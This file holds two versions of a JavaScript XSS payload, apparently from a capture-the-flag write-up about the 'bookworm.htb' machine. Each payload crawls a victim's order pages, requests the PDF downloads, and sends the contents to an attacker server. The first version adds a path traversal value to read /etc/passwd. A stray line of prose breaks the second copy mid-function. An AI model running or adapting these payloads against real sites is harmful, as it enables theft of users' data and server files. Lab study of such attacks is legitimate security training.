//
//

function getOrder(html_page) {
    const parser = new DOMParser();
    const htmlString = html_page;
    const doc = parser.parseFromString(htmlString, 'text/html');
    const orderLinks = doc.querySelectorAll('tbody a');
    const orderUrls = Array.from(orderLinks).map((link) => link.getAttribute('href'));
    return orderUrls;
}
function getDownload(html) {
    const container = document.createElement('div');
    container.innerHTML = html;
    const downloadLink = container.querySelector('a[href^="/download"]');
    const downloadURL = downloadLink ? downloadLink.href.substring(0, downloadLink.href.lastIndexOf("=") + 1) + ".&bookIds=../../../../../../etc/passwd" : null;
    return downloadURL;
}
function arrayBufferToBase64( buffer ) {
    var binary = '';
    var bytes = new Uint8Array( buffer );
    var len = bytes.byteLength;
    for (var i = 0; i < len; i++) {
        binary += String.fromCharCode( bytes[ i ] );
    }
    return btoa( binary );
}
function sendrequest(url) {
    var attacker = "http://10.10.14.103/?url=" + encodeURIComponent(url);
    fetch(url).then(async res => {
        fetch(attacker + "&data=" + arrayBufferToBase64(await res.arrayBuffer()))
    });
}
async function getPdf(url) {
    const response = await fetch(url);
    const html = await response.text();
    const download = getDownload(html);
    if (download) {
        sendrequest(download);
    }
}
fetch("http://bookworm.htb/profile").then(async (res) => {
    const html = await res.text();
    const orders = getOrder(html);
    for (const path of orders) {
        const url = "http://bookworm.htb" + path;
        getPdf(url);
    }
});

//
//
//

function get_orders(html_page){
 // Create a new DOMParser instance
 const parser = new DOMParser();
 // HTML string to be parsed
 const htmlString = html_page;
 // Parse the HTML string
 const doc = parser.parseFromString(htmlString, 'text/html');
 // Find all the anchor tags within the table body
 const orderLinks = doc.querySelectorAll('tbody a');
 // Extract the URLs and store them in an array
 const orderUrls = Array.from(orderLinks).map((link) =>
link.getAttribute('href'));
 // Returns an array of paths to orders
 return orderUrls;
}
function getDownloadURL(html) {
 // Create a temporary container element to parse the HTML
 const container = document.createElement('div');
 container.innerHTML = html;
 // Use querySelector to select the download link element
 const downloadLink = container.querySelector('a[href^="/download"]');
 // Extract the download URL
 const downloadURL = downloadLink ? downloadLink.href : null;
 // Return a complete url to fetch the download item
 return downloadURL;
}
function fetch_url_to_attacker(url){
 var attacker = "http://<your server ip>:8000/?url=" + encodeURIComponent(url);
Again, I upload this scirpt to my avatar, and poison the note with XSS, and wait for requests to
come to my server.
 fetch(url).then(
 async response=>{
 fetch(attacker, {method:'POST', body: await response.arrayBuffer()})
 }
 );
}
function get_pdf(url){
 // will fetch the PDF (takes the downloadURL as argument) and send its content to
my server
 fetch(url).then(
 async response=>{
 fetch_url_to_attacker(getDownloadURL(await response.text()));
 })
}
// First request for debugging to make sure the script is running
fetch("http://<you server ip>:8000/?trying")
// Now fetch content
fetch("http://thing.edu/profile").then(
 async response=>{
 for (const path of get_orders(await response.text())){
 fetch_url_to_attacker("http://bookworm.htb" + path);
 get_pdf("http://bookworm.htb" + path);
 }
 }
)
